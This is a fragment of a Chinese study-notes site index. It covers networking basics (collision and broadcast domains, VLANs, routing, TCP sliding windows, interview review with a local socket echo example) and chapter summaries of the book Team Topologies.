https://www.cnblogs.com/bakari/archive/2012/09/08/2677086.html   概念理解 #  冲突域 #  连接在同一导线上的所有工作站的集合，或者说是同一物理网段上所有节点的集合或以太网上竞争同一带宽的节点集合。这个域代表了冲突在其中发生并传播的区域，这个区域可以被认为是共享段。在 OSI 模型中，冲突域被看作是第一层的概念，连接同一冲突域的设备有 Hub，Reperter 或者其他进行简单复制信号的设备。也就是说，用 Hub 或者 Repeater 连接的所有节点可以被认为是在同一个冲突域内，它不会划分冲突域。\n广播域 #  接收同样广播消息的节点的集合。如：在该集合中的任何一个节点传输一个广播帧，则所有其他能收到这个帧的节点都被认为是该广播帧的一部分。由于许多设备都极易产生广播，所以如果不维护，就会消耗大量的带宽，降低网络的效率。由于广播域被认为是 OSI 中的第二层概念，所以像 Hub，交换机等第一，第二层设备连接的节点被认为都是在同一个广播域。而路由器，第三层交换机则可以划分广播域，即可以连接不同的广播域。\n在不同网络互联设备上的特点 #  传统以太网操作 #  主机 A 只是想要发送一个单播数据包给主机 B。但由于传统共享式以太网的广播性质，接入到总线上的所有主机都将收到此单播数据包。同时，此时如果任何第二方，包括主机 B 也要发送数据到总线上都将冲突，导致双方数据发送失败。我们称连接在总线上的所有主机共同构成了一个冲突域。\n当主机 A 发送一个目标是所有主机的广播类型数据包时，总线上的所有主机都要接收该广播数据包，并检查广播数据包的内容，如果需要的话加以进一步的处理。我们称连接在总线上的所有主机共同构成了一个广播域。\n如下图：\n中继器 Repeater #  中继器出现的两个功能为：\n 扩展网络距离，将衰减信号经过再生。 实现粗同轴电缆以太网和细同轴电缆以太网的互连。  通过中继器虽然可以延长信号传输的距离、实现两个网段的互连。但并没有增加网络的可用带宽。如下图所示，网段 1 和网段 2 经过中继器连接后构成了一个单个的冲突域和广播域：\n集线器 HUB #  集线器实际上相当于多端口的中继器。集线器通常有8个、16个或24个等数量不等的接口。\n集线器同样可以延长网络的通信距离，或连接物理结构不同的网络，但主要还是作为一个主机站点的汇聚点，将连接在集线器上各个接口上的主机联系起来使之可以互相通信。\n实际上，在集线器内部，各接口都是通过背板总线连接在一起的，在逻辑上仍构成一个共享的总线。因此，集线器和其所有接口所接的主机共同构成了一个冲突域和一个广播域。如下图所示：\n网桥 Bridge #  网桥（Bridge）又称为桥接器。和中继器类似，传统的网桥只有两个端口，用于连接不同的网段。和中继器不同的是，网桥具有一定的\u0026quot;智能\u0026quot;性，可以\u0026quot;学习\u0026quot;网络上主机的地址，同时具有信号过滤的功能。\n如下图所示：\n  网段 1 的主机 A 发给主机 B 的数据包不会被网桥转发到网段 2。因为，网桥可以识别这是网段 1 内部的通信数据流。\n  同样，网段 2 的主机 X 发给主机 Y 的数据包也不会被网桥转发到网段 1。可见，网桥可以将一个冲突域分割为两个。其中，每个冲突域共享自己的总线信道带宽。\n  但是，如果主机 C 发送了一个目标是所有主机的广播类型数据包时，网桥要转发这样的数据包。网桥两侧的两个网段总线上的所有主机都要接收该广播数据包。因此，网段 1 和网段 2 仍属于同一个广播域。\n  交换机 Switch #  交换机（Switch）也被称为交换式集线器。它的出现是为了解决连接在集线器上的所有主机共享可用带宽的缺陷。\n交换机是通过为需要通信的两台主机直接建立专用的通信信道来增加可用带宽的。从这个角度上来讲，交换机相当于多端口网桥。\n如下图所示：交换机上的每个接口都是自己的一个冲突域。\n交换机同样没有过滤广播通信的功能。如果交换机收到一个广播数据包后，它会向其所有的端口转发此广播数据包。因此，交换机和其所有接口所连接的主机共同构成了一个广播域。\n我们将使用交换机作为互连设备的局域网称为交换式局域网。\n路由器 Router #  路由器工作在网络层，可以识别网络层的地址 IP 地址，有能力过滤第 3 层的广播消息。实际上，除非做特殊配置，否则路由器从不转发广播类型的数据包。因此，路由器的每个端口所连接的网络都独自构成一个广播域和冲突域。\n如下图所示：\n"},{"id":218,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/3.vlan%E4%B8%8Etrunk/","title":"3. Vlan与 Trunk","section":"网络基本功","content":" 学习地址：\n https://community.emc.com/message/834012#834012   VLAN #  概念 #  虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。\nVLAN 是一种比较新的技术，工作在 OSI 参考模型的第 2 层和第 3 层，一个 VLAN 就是一个广播域，VLAN 之间的通信是通过第3层的路由器来完成的。\n部署结构 #  下图显示了一个常规的部署，左边这张图节点连接到交换机，交换机连接到路由器。所有的节点都位于同一 IP 网络，因为他们都连接到路由器同一接口。\n另一种常用的拓扑结构是两个交换机被一个路由器分离开来：\n"},{"id":219,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/4.%E8%B7%AF%E7%94%B1/","title":"4.路由","section":"网络基本功","content":" 学习地址：\n https://community.emc.com/message/835157#835157   路由器 #  以太网交换机工作在第二层即数据链路层，用于在同一网络内部转发以太网帧。\n但是，当源和目的IP地址位于不同网络时，以太网帧必须发送给路由器。路由器负责在不同网络间传输报文，通过路由表来决定最佳转发路径。当主机将报文发送至不同IP地址时，由于主机无法直接与本地网络以外的设备通信，报文被转发至默认网关。默认网关就是数据流从本地网络路由至远端设备的目的地。它通常用来连接本地网与公共网。\n报文的转发过程 #  路由器在一个接口接收报文并将它从另一个接口转发出去。路由器主要执行以下三个步骤：\n 将第二层的帧头和帧尾移除，解析出第三层报文。 检查 IP 报文的目的 IP 地址，在路由表中查找最佳路由。 如果路由器找到一条最佳路径，则将三层报文封装到新的二层帧中，并将帧转发到输出端口。  如下图所示：\n过程详解 #  发送报文 #  PC 1 发送报文给PC 2 时：\n 首先必须确定目的 IPv4 地址是否位于同一网络。  PC 1 通过将自己的 IPv4 地址与子网掩码做与操作，来判断 PC 1 所属的网段。 接下来，PC 1 对目的 IPv4 地址与 PC 1 的子网掩码做同样的与操作。   如果目的网络地址与PC 1网段相同，则PC 1不使用默认网关，而是在 ARP 缓存中查找目的 IPv4 地址的设备MAC地址。如果MAC地址不在缓存中，则 PC 1 产生一个 ARP 请求来获取地址并将报文发给目的地址。 如果目的网络地址位于另一网络，则PC 1将报文转发至默认网关。  要确定默认网关的 MAC 地址，PC 1 在它的 ARP 表中查找默认网关的 IPv4 地址以及相应的 MAC 地址。 如果 ARP 表中没有默认网关的对应表项，则 PC 1 发送 ARP 请求。路由器 R1 回复 ARP 响应。之后 PC 1 将报文转发至默认网关的 MAC 地址，即路由器 R1 的 Fa0/0 接口。    路由器转发 #  R1 从 PC 1 接收到以太网帧后执行以下步骤：\n  R1 检查目的 MAC 地址，与接收端口 FastEthernet 0/0 相匹配，因此，将帧复制到 buffer。\n  R1 识别以太网类型为 0x800，意味着以太网帧的数据部分包含 IPv4 报文。\n  R1 解封装该以太网帧。\n  由于目的 IPv4 地址与 R1 直连的任何网络都不相符，R1 在路由表中查找包含该目的 IPv4 地址主机的网络地址。\n  "},{"id":220,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E5%8A%9F/8.tcp%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/","title":"8. Tcp滑动窗口","section":"网络基本功","content":" 学习网址：\n https://www.kancloud.cn/wizardforcel/network-basic/135490   TCP 滑动窗口 #  介绍 #  将 TCP 与 UDP 这样的简单传输协议区分开来的根据是它们传输数据的质量。主要考虑的是以下两个关键功能：\n 可靠性：保证数据确实到达目的地。如果未到达，能够发现并重传。 数据流控：管理数据的发送速率，以使接收设备不致于过载。  要完成这些任务，整个协议操作是围绕滑动窗口确认机制来进行的。因此，理解了滑动窗口，也就是理解了TCP。\n面向流的滑动窗口确认机制 #  TCP将独立的字节数据当作流来处理。一次发送一个字节并接收一次确认显然是不可行的。即使重叠传输（即不等待确认就发送下一个数据），速度也还是会非常缓慢。\nTCP 消息确认机制如下图所示，首先，每一条消息都有一个识别编号，每一条消息都能够被独立地确认，因此同一时刻可以发送多条信息。设备 B 定期发送给 A 一条发送限制参数，制约设备 A 一次能发送的消息最大数量。设备 B 可以对该参数进行调整，以控制设备 A 的数据流。\n为了提高速度，TCP 并没有按照字节单个发送而是将数据流划分为片段。片段内所有字节都是一起发送和接收的，因此也是一起确认的。确认机制没有采用 message ID 字段，而是使用的片段内最后一个字节的 sequence number。因此一次可以处理不同的字节数，这一数量即为片段内的 sequence number。\n发送方和接收方必须就它们将要为数据流中的字节指定的 sequence number 达成一致。这一过程称为同步，在TCP连接建立时完成。\n我们可以将 TCP buffer 中的数据分为以下的四类，并把他们看作一个时间轴，如下图所示：\n 已发送已确认：数据流中最早的字节已经发送并得到确认。这些数据是站在发送设备的角度来看的。 已发送但尚未确认：已发送但尚未得到确认的字节。发送方在确认之前，不认为这些数据已经被处理。 未发送而接收方已Ready：设备尚未将数据发出，但接收方根据最近一次关于发送方一次要发送多少字节确认自己有足够空间。发送方会立即尝试发送。 未发送而接收方Not Ready：由于接收方 not ready，还不允许将这部分数据发出。  实际上，收发双方各自维护一套独立的变量，来监控发送和接收的数据流落在哪一类。\n发送窗口与可用窗口 #  概念 #  整个过程关键的操作在于接收方允许发送方一次能容纳的未确认的字节数。这称为发送窗口，有时也称为窗口。该窗口决定了发送方允许传送的字节数，也是 2 类和 3 类的字节数之和。\n$$发送窗口 \\cong 窗口, size(窗口) = (已发送但尚未确认字节 + 未发送而接收方已 Ready 字节)$$\n最后两类（接收方准备好而尚未发送，接收方未准备好）的分界线在于添加了从第一个未确认字节开始的窗口。如下图所示：\n确认处理以及窗口缩放 #  过了一段时间，目标设备向发送方传回确认信息。目标设备不会特别列出它已经确认的字节，因为这会导致效率低下。目标设备会发送自上一次成功接收后的最长字节数。\n当发送设备接收到确认信息，则会将一部分第 2 类字节转移到第 1 类，因为它们已经得到了确认。因为窗口大小没有改变，窗口向右移动确认接收的长度，部分第 4 类字节移动至第 3 类。\n处理丢失的信息 #  TCP 包括一个传输及重传的计时机制。TCP 会重传丢失的片段。但有一个缺陷是：因为它不会对每一个片段分别进行确认，这可能会导致其他实际上已经接收到的片段被重传（比如 42 至 45）。\n"},{"id":221,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/","title":"面试复习","section":"计算机网络","content":" 通过西电的在线 MOOC 学习网络安全：\n https://www.icourse163.org/learn/UESTC-235006?tid=272013#/learn/content?type=detail\u0026id=1004490139\u0026sm=1   计算机网络 #  三种工作方式：\n 单工：数据只能在一个方向上传输\n半双工：数据可以在两个方向上传输，但是一次只允许数据在一个方向传输\n全双工：允许数据同时在两个方向上传输\n IPv4 三类地址：\n 见：https://tools.ietf.org/html/rfc3330\nA类地址 1.0.0.1-126.255.255.254，第一段第一位二进制位以 0 开头，最后三段表示主机地址；\nB类地址 128.1.0.1-191.255.255.254，第一段前两位二进制位为 10 开头，最后两段表示主机地址；\nC类地址 192.0.1.1-223.255.255.254，第一段前三位二进制位为 110 开头，最后一段表示主机地址；\nD 类地址（群播地址） ,第一段前四位为 1110 开头。\n IP 协议中的生存时间：\n 生存时间（TTL，time-to-live）是Internet协议（IP）包中的一个值，它告知路由器该包是否在网络中时间过长而应该被丢弃。\n 双绞线的双绞原因：\n 绞合可以减少对相邻导线的电磁干扰。\n 关于 10BASE-T：\n 10 代表数据传输率，BASE 基带传输，T 代表双绞线。F 为光纤\n 网络冲突：\n IEEE802.3 协议采用 CSMA/CD 协议，一定会发生冲突；\n802.4 和 802.5 则不会。\n 路由选择协议：\n RIP 协议：AS 内部的路由选择协议，采用距离向量算法，限制最大为 15 的跳度；\nOSPF 协议：AS 内部的路由选择协议，采用 Dijkstra 路径选择算法；\nBGP 协议：AS 之间的路由选择协议，同样使用距离向量算法，但是传输信息中包含了 AS-PATH，因此不会出现环路问题。\n SOCKET 编程：\n 服务端代码：\nfrom socket import * HOST = \u0026#39;localhost\u0026#39; PORT = 21567 BUFFERSIZE = 1024 ADDR = (HOST, PORT) tcpServerSocket = socket(AF_INET, SOCK_STREAM) tcpServerSocket.bind(ADDR) # 绑定地址（主机名，端口号） tcpServerSocket.listen(5) # 开始监听TCP while True: print \u0026#39;waiting for connection...\u0026#39; # 被动接受TCP客户端的请求到来，阻塞式 tcpClientSocket, addr = tcpServerSocket.accept() print \u0026#39;connected from:\u0026#39; + str(addr) while True: data = tcpClientSocket.recv(BUFFERSIZE) if not data: break # 发送TCP数据 tcpClientSocket.send(\u0026#39;%s\u0026#39; % data) tcpClientSocket.close() tcpServerSocket.close() 客户端代码：\nfrom socket import * HOST = \u0026#39;localhost\u0026#39; PORT = 21567 BUFFERSIZE = 1024 ADDR = (HOST, PORT) tcpClientSocket = socket(AF_INET, SOCK_STREAM) tcpClientSocket.connect(ADDR) # 连接到服务器 while True: data = raw_input(\u0026#39;\u0026gt;\u0026#39;) if not data: break tcpClientSocket.send(data) data = tcpClientSocket.recv(BUFFERSIZE) if not data: break print data tcpClientSocket.close()  码分多址通信（CDMA）：\n 码分多址( Code Division Multiple Access，CDMA）是通过编码区分不同用户信息，实现不同用户同频、同时传输的一种通信技术。\nhttps://blog.csdn.net/huanhuan_Coder/article/details/83012467\n 虚电路：\n 虚电路表示这只是一条 逻辑上的连接 ，分组都沿着这条逻辑连接按照存储转发方式传送，而 并不是真正建立了一条物理连接 。包括建立连接，传输数据，拆除连接三个阶段。建立连接之后就类似于专线，所以不存在路由选择\n 五层数据封装的名称：\n  应用层，Message，报文； 传输层，Segment，报文段； 网络层，Datagram，数据报； 链路层，Frame，帧； 物理层，Bits，比特。   以太网帧长度的限制：\n 在传统以太网中,有最小帧长度和最大帧长度的限制。\n以太网的帧长度总是在一定范围内浮动，一般最大的帧长是 1518 字节，最小的帧长是 64 字节。在实际应用中，帧的大小是由设备的 MTU（最大传输单位）即设备每次能够传输的最大字节数自动来确定的。\n 网络协议的三要素：\n 语法 用来规定信息格式；数据及控制信息的格式、编码及信号电平等。\n语义 用来说明通信双方应当怎么做；用于协调与差错处理的控制信息。\n定时 （时序）定义了何时进行通信，先讲什么，后讲什么，讲话的速度等。比如是采用同步传输还是异步传输！\n 常见广域网：\n 几种常用的广域网：公用电话交换网（PSTN）、分组交换网（X.25）、数字数据网（DDN）、帧中继（FR）、交换式多兆位数据服务（SMDS）和异步传输模式（ATM）。\n 波特率：\n 波特率，可以通俗的理解为一个设备在一秒钟内发送（或接收）了多少码元的数据。\n 局域网广播地址：\n 主机号为全 1，表示广播地址\n TCP/UDP 常见端口的服务：\n 见：http://tool.oschina.net/commons?type=7 与 https://www.jianshu.com/p/048963e312bc\n常见数据库所在端口：\n   mysql sqlserver server sqlserver monitor oracle postgre sql oracle emctl oracle xdb oracle xdb ftp     3306 1433 1434 1521 5432 1158 8080 2100     TCP/IP 协议族以及其安全隐患 #  网络按范围分类：LAN、WAN。\n计算机协议的三要素：语法、语义和协议。\n协议数据封装：\nFH---IH---TH---AH---DATA---FT ARP 协议 #  ARP 协议的安全隐患，主要有三类：ARP 窃听、ARP 欺骗（ARP 污染，黑洞攻击）、GARP 滥用攻击。\nARP 协议安全隐患的防御技术，主要有四类：采用静态绑定的方式防止 ARP 欺骗（Windows \u0026amp; Linux 都可以使用 arp 命令操作其映射表）、采用 ARP 代理服务器、在网络设备上对 ARP 消息进行检测和控制、禁用 GARP 功能（主机可以选择性地忽略 GARP 消息）。\nIP 协议 #  IP 协议的安全隐患，主要有三类：IP 窃听、IP 地址假冒攻击、IP 碎片攻击。\nIP 协议的安全防御方法：入口过滤、出口过滤、IP 溯源。\nTCP 协议 #  TCP 协议的特点：全双工连接、面向连接、可靠性、面向字节流的协议。\nTCP 协议的安全隐患：SYN 泛洪攻击、ACK 泛洪攻击、序列号预测攻击、LAND 攻击（使服务器建立自连接）。\nUDP 协议 #  UDP 协议的特点：无连接的协议、不可靠的协议、不保序协议。\nUDP 协议的安全隐患：假冒、劫持、泛洪\nHTTP 协议 #  HTTP 协议的特点：是一个基于请求与响应模式的、无状态的应用层协议；常基于 TCP 的连接方式；绝大多数 WEB 应用都是构建在 HTTP 协议之上。\nHTTP 请求消息格式组成：请求行、消息报头、请求正文。\nHTTP 相应消息格式组成：初始状态行、首部行、实体主体。\nHTTP 协议的安全隐患，主要有两种攻击：钓鱼攻击和跨站脚本攻击。\n隔离技术 #  "},{"id":222,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/1.%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E7%9A%84%E9%99%B7%E9%98%B1/","title":"1.组织结构的陷阱","section":"高效能团队模式","content":"第一章 组织结构的陷阱 #  核心观点 #  作为管理接口的技术人员，我们必须改变之前的思想。\n  不再将团队视作为一组可替换的个体，它们只要沿用“正确”的流程和使用“正确”的工具就能获得成功；\n  而是将人员和技术视作为社会技术生态系统中的一份子，正如计算芯片中的碳和硅一样；\n  组织结构和实际的工作方式之间存在出入：\n 人们为了完成工作，通常会与另一条汇报线上的人员进行横向或纵向沟通； 组织应该有意识地培养这种创造力和解决问题的能力，并从中受益，而不仅仅局限于自顶向下和自底向上的沟通和汇报；  每个组织都存在三种组织结构（知识型组织成功的关键在于后两者）：\n 官方架构（组织结构图），促进合规性； 非正式架构，个体间的“影响范围”； 价值创造架构，工作是如何在个人间和团队间完成的；  Naomi Stanford 总结的五条组织设计法则：\n 根据令人信服的理由来设计； 反馈：为设计决策提供开发选项； 选择正确的设计时机； 容错：寻找事务偏离轨迹的线索； 动态：对未来保持警惕；  团队拓扑是一种全新的团队思维模式：\n 它提供了四类基本团队类型：流动式团队、平台团队、赋能团队、复杂子系统团队； 以及三种核心的团队交互模式：协作模式、服务模式和促进模式；  康威定律：\n Melvin E. Conway: Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization\u0026rsquo;s communication structure. Eric Raymond 给出了一个幽默而形象的例子：如果有四个小组合作开发一个编译器，那么你将得到一款具有四个步骤的编译器；  \u0010认知负荷：\n  一个人在给定时间内大脑能够存储的信息量上限。对一个团队来说就是所有团队成员的认知能力上限；\n  我们需要把团队摆在第一位，鼓励去限制他们的认知负荷。将认知负荷作为团队规模、分配指责和建立团队边界的有力工具；\n  例子🌰：一个迭代周期内频繁的切换任务会极大的打击团队的主动性。可以通过 Daniel Pink 提到的内在动机三要素解释：\n 自治：被多个团队源源不断的请求和优先级淹没，损失了自治性； 精通：构建了样样都懂，却无一精通的团队； 目标：一个团队负责过多的指责领域；    快速流动的障碍：\n 违背康威定律、缺乏激励、过多意外、流动阻塞、每隔几年的痛苦重构、团队被牵扯进太多的方向、混乱的组织设计、软件太大超出团队能力范畴；  参考书籍 #  Naomi Stanford:Guide to Organisation Design: Crea†ing High Performing and Adaptable Enterprises;\nMark Schewarts\u0026rsquo;s Paper: Thinking Environment;\nGeary Rummler, Alan Brache: Improving Performance: How to Manage the White Space on the Organization Chart;\nNiels Pflegling: Organize for Complexity;\nDaniel Pink\u0026rsquo;s Datamation: How Do Committees Invent?\n"},{"id":223,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/2.%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B/","title":"2.康威定律","section":"高效能团队模式","content":"第二章 康威定律为何如此重要 #  康威定律现代版本：\n 如果系统的架构和组织的架构不一致，那么组织架构将会成为赢家；  逆康威定律：\n 组织需要通过团队和组织结构的改进来实现预期的软件架构；  经过验证的软件架构良好实践：\n 松耦合：组建不强依赖于其他组件； 高内聚：组件拥有清晰的指责边界，并且它们的内部元素强相关； 清晰合理的版本兼容性； 清晰合理的跨团队测试；  小心那些流于表面的康威定律，错误地解读康威定律可能会带来风险：\n 工具：盲目地为整个组织选择单一的工具是不合适的，如果两个团队的职责边界没有交集，那么还坚持使用相同的工具就没有什么价值了。用一句话概括来说就是：独立团队使用独立工具，协作团队使用共享工具； 多组件团队：很多组织草率地按照康威定律建立了大量不同的组件团队来分别构建系统的各个小部分； 通过反复的组织结构调整来建立山头或减少人员；  "},{"id":224,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/3.%E5%9B%A2%E9%98%9F%E4%BC%98%E5%85%88/","title":"3.团队优先","section":"高效能团队模式","content":"第三章 团队优先的思维方式 #  概述 #  现代复杂系统需要高效能团队，对于需要大量信息的知识密集型、问题解决型任务，一个有凝聚力的团队的表现要远远超出个人的集合；\n依赖个体来理解和有效处理构建和演进现代软件所需要的信息量和信息的本质是不可持续的，团队活力远比谁在团队中更重要；\n建设小而美的长期团队 #  团队规模：\n 本书中的团队定义：一个由 5-9 人组成的稳定小组，作为一个整体朝着共同的目标努力。我们不应该把工作指派给个人，而是指派给团队。 一个有效的团队最多由 7-9 人组成。  7-9 这一人数限制有着明确的理论基础：\n Amazon 提出的 “两张披萨” 理论，即团队规模应该是两张披萨能够喂饱全体成员； 这一人数限制是 Scrum 框架推荐的，它源于对群体认知和信任的进化限制； 邓巴数字：15 是一个人可以信任的人数极限，其中只有 5 个人能够获得深入的了解和信任；  小规模团队带来信任。\n工作流向长期团队：\n 团队需要时间磨合来实现高效，通常团队需要花 2 周到 3 个月甚至更长的时间来形成一个有凝聚力的集体； 提升团队存活周期的最佳办法就是提升团队稳定性。团队应该保持稳定，而非一成不变，仅在必要的时候进行偶尔的调整。  让团队对软件负责：\n 让一个团队负责系统或子系统； 需要明确的是：团队代码所有权划分并不是在划分地盘，团队对代码负责并维护，而不应该觉得代码是它们的而因此排斥其他人；  团队成员也需要具备团队优先的思维：\n 团队应该是交付的基础，而非个人； 即便通过引导，有的人依然不适合团队的工作，或者不愿意将团队的需求放在个人需求之上。这些人会影响团队工作，在极端场合下，甚至会摧毁团队；  在团队中拥抱多样性：\n 一点异质性会极大的帮助创建一个团队的团队；  奖励团队而非奖励个人。\n良好设计的边界可以最小化认知负荷 #  约束团队职责以匹配团队认知负荷：\n 使用团队优先方法，团队的职责与团队所能处理的认知负荷是吻合的。  Sweller 定义了三种不同的认知负荷：\n 固有认知负荷，与问题领域的基本任务相关； 额外认知负荷，与任务处理的环境相关； 相关认知负荷，与那些需要额外关注学习和高性能方面的任务相关；  一般来说，为了高效地交付和运维现代软件系统，组织应该：\n 试图最小化固有认知负荷：通过招聘、培训等方式解决； 消除额外认知负荷：自动化、成立工具平台部门等； 为相关认知负荷预留足够的空间：”增值“思维的所在；  限制团队认知负荷也意味着限制了团队工作的子系统领域大小，所以将任务拆分就显得特别重要。\n使用相关领域的复杂度来度量认知负荷：\n 试图通过一些简单的手段（比如代码行数等）来确认软件的认知负荷，可能会被误导； 我们可以通过团队职责领域的数量和相关组织内部的复杂度来进行评估；  我们将领域复杂度归类为”简单“、”复杂“、”非常复杂“，可以得到一些启发式结论：\n 可以将每个领域分配给单一团队； 一个 7-9 人的黄金规模团队应该可以应对 2-3 个简单领域； 如果一个团队已经负责了非常复杂的领域，那么就不应该再给他们分配更多的领域，即便是一个非常简单的领域； 避免单一团队负责两个复杂领域；  软件边界大小匹配团队认知负荷。为了增加团队可以负责的领域大小，可以通过降低”固有认知负荷“与”额外认知负荷“的方式，来优化团队工作生态，从而最大化团队认知容量。\n"},{"id":225,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/4.%E9%9D%99%E6%80%81%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/","title":"4.静态团队拓扑","section":"高效能团队模式","content":"静态团队拓扑 #  反模式 #  两种特别有代表性的反模式：\n “临时起意”的团队设计：需要考虑交流成本； “频繁调动”团队成员：团队仅仅为了项目而组建，但是在项目完成之后就立即被打散。看起来这样体现了高度的灵活性，以及更快速地应对交付日期的响应能力，但是反复切换上下文的成本被低估；  DevOps 拓扑反映了两个核心理念：\n 没有一种通用的组织架构方法来让 DevOps 获得成功； 部分拓扑是阻碍 DevOps 成功的反模式，它们忽略了甚至同 DevOps 的核心理念背道而驰；  其中第二点也就是说：并不存在所谓“正确”的团队拓扑，但在组织中存在很多“错误”的团队拓扑。\n成功的模式 #  特性团队依赖于高度工程能力成熟度和互信：\n 特性团队往往需要修改多个代码库，这些代码库由不同组件团队管理；多个团队在同一个代码库中叠加地工作，会导致代码缺乏负责人，除非团队间遵循高度协作的规则； 随着业务发展，我们逐渐需要一些人考虑和维护整个系统，确保子系统可以融入整个系统，满足期待的用户体验、性能和可靠性。于是“系统架构师”、“系统负责人”、“集成经理”等角色应运而生。  产品团队需要支持系统：\n 团队保持自主性的关键在于不被外部依赖所阻碍，也就是说新 feature 不能够因为某些团队掌控范围之外的事情发生而处于停滞状态； 产品团队通常承担了巨大的快速交付压力，如果它们所使用的系统无法提供必要的自主性支持，那么就会导致日益增长的摩擦；  云团队无需创建应用基础设施：\n “云团队”并不是换了一个名字的“基础设施团队”，他需要提供云服务带来的速度和扩展性；  SRE (Site Reliability Engineering) 让扩展性成为可能性：\n SRE 是 Google 创建的一种软件运维与改进方法，这个团队更加关注“错误预算（Error Budget）”和“服务等级目标（Service-Level Objectives, SLOs）” 它们有能力将低质量的软件回退给软件开发团队，团队成员需要优秀的软件编程能力；  选择团队拓扑需要考虑的因素 #  技术和文化成熟度。\n组织大小、软件规模和工程能力成熟度：\n 组织大、能力成熟的团队：端对端和专职团队聚焦可用性； 组织大、能力不成熟的团队：端到端团队的常规协作； 组织小、能力成熟的团队：依赖于 PaaS 的专职团队； 组织小、能力不成熟的团队：专职团队间紧密合作；  拆分职能竖井：\n  有时我们可以将一些特定团队所承担的若干职能拆分和授权给其他团队来减少或消除对这种团队的依赖。比如：DBDev 从 DBA 中拆分出来。\n  在工作负荷增加时，不能一味地增加人手和团队，而是需要权衡利弊，认真考虑团队间哪些依赖应该减少，而哪些依赖应该保留。\n  团队间等待时间：\n 我们需要调研和跟踪团队间的依赖关系，以及因为等待而耗费的时间。 Diane Strode 和 Sid Huff 将团队间依赖归位三类：“知识型依赖”、“任务型依赖”、“资源型依赖”，这样的分类有助于分析团队间的依赖，以及潜在的针对工作流的约束。  "},{"id":226,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/5.%E5%9B%9B%E7%B1%BB%E5%9F%BA%E6%9C%AC%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/","title":"5.四类基本团队拓扑","section":"高效能团队模式","content":"四类基本团队拓扑 #  本书的核心是定义了四类基本团队拓扑：\n 流动式团队、赋能团队、复杂子系统团队、平台团队；  流动式团队 #  什么是“流动式团队”？\n 它对应一条单一、有价值的工作流，这也许是一个产品、一项服务、一组功能特性、一个用户故事或者一组用户画像。 流动式团队是组织中最主要的团队类型，其他基本团队拓扑的目标都是为了减轻流动式团队的负担。 与“流动式团队”相反的是按照“项目”组织开发工作。  “流动式团队”的必要能力，包括但不限于\n 应用的安全性、商业和技术的可行性分析、设计和架构、开发和编码、基础设施和可运维性、度量和监控、产品管理、测试和质量保证、用户体验；  为什么要叫做”流动式团队“而不是”产品团队”或“特性团队“：\n “流动”一词有着更广泛的含义，它有助于强化组织对流动性的关注，从而确保流动的顺畅； 并非所有的软件都有产品或者特性这样的概念，但是总是可以从流动性的角度出发；  流动性团队的预期的行为：P94。\n赋能团队 #  什么是“赋能团队”？\n 赋能团队由特定技术领域或产品领域的专家组成，它们给流动式团队提供“调研、学习、实践”新技术的能力。团队进行调研工作，尝试不同的方案，并在工具、实践、框架、技术栈等方面给出高质量的建议。 赋能团队应该尽可能避免自己成为知识的“象牙塔”：  不应该干涉其他团队的技术选择，而是要帮助团队理解并遵循组织级的技术约束； 应该提高流动式团队的自主性，而不是推广自己手动已经有的解决方案；    “赋能团队”的预期行为：\n 赋能团队要主动了解流动式团队的需求，在深入协作时建立定期检查点和联合沟通机制； 赋能团队要保持它们的专业能力保持在浪潮之巅（在过去，这常常被视为架构师或者创新团队的使命）； 它们既要传播好消息，也要传播坏消息； 当流动式团队难以直接使用某些服务时，赋能团队应该充当内外部的服务代理； 不仅要促进自身团队内的学习，也要在流动式团队之间扮演组织内促进共享必要知识的角色。  与实践社区（Communities of Practice, CoP）:\n 共同点：它们都能提高团队的认知和能力； 区别：赋能团队每天的工作就是赋能，而实践社区则是一个相对松散的组织，每周甚至每个月才会搞一次活动；  复杂子系统团队 #  